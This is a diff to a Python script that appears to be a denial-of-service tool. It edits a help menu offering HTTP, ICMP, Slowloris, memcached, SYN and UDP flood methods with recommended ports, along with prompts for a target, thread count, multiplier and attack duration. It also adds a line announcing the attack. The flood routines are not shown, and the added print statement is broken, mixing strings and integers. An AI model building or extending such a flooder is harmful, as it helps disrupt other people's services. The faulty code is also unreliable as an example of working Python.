@@ -73,12 +73,12 @@ logo = """
 """
 
 helpmenu = """
-    HTTP: URL/IPV4, PORT 80
-    ICMP: IPV4 Address, if you need the address, use nslookup.io.
-    SLOWLORIS: URL/IPV4, PORT 80/443/53 (Recommend 80)
-    MEMCACHED: URL/IPV4, PORT 80/443/53 (Recommend 80)
-    SYN: URL/IPV4, PORT 80/443/53 (Recommend 53)
-    UDP: URL/IPV4, PORT 80/443/53 (Recommend 53)
+  HTTP: URL/IPV4, PORT 80
+  ICMP: IPV4 Address, if you need the address, use nslookup.io.
+  SLOWLORIS: URL/IPV4, PORT 80/443/53 (Recommend 80)
+  MEMCACHED: URL/IPV4, PORT 80/443/53 (Recommend 80)
+  SYN: URL/IPV4, PORT 80/443/53 (Recommend 53)
+  UDP: URL/IPV4, PORT 80/443/53 (Recommend 53)
 """
 
 print(Fore.RED + logo + Fore.BLUE)
@@ -89,7 +89,7 @@ ip = input(Fore.CYAN+"  URL/IP: "+Fore.WHITE)
 
 threadcount = input(Fore.CYAN+"  How many threads (1-300): "+Fore.WHITE)
 
-count = input(Fore.CYAN+"  Multiplier(1-50): "+Fore.WHITE)
+count = input(Fore.CYAN+"  Multiplier(1x-50x): "+Fore.WHITE)
 
 length = input(Fore.CYAN+"  How long to hit (Seconds): "+Fore.WHITE)
 
@@ -135,6 +135,8 @@ if yesno == "N":
   time.sleep(2)
   os.system("clear")
   exit()
+
+print(Fore.LIGHTYELLOW_EX+"Hitting "+ip+"with "+int(threadcount)*int(count)+"threads using "+hitmethod)
 
 if hitmethod == "HTTP":
   t1 = threading.Thread(target=http)
